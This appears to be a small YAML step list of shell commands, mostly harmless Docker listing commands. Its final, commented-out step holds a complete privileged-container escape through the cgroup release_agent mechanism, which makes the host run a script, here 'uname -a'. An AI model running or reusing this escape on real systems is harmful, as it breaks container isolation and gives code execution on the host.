version: v1.1.0

steps:
 - cmd: docker images list
 - cmd: docker ps -a
 - cmd: bash echo hello world
 - cmd: docker network ls
# - cmd: docker run --privileged ubuntu /bin/sh -c "echo privileged && fdisk -l && cd /etc && ln -sf ../proc/self/mounts mtab && mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` && echo "$host_path/cmd" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo "uname -a > $host_path/output 2>&1" >> /cmd && chmod a+x /cmd && cat /cmd && sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" && sleep 3 && head /output"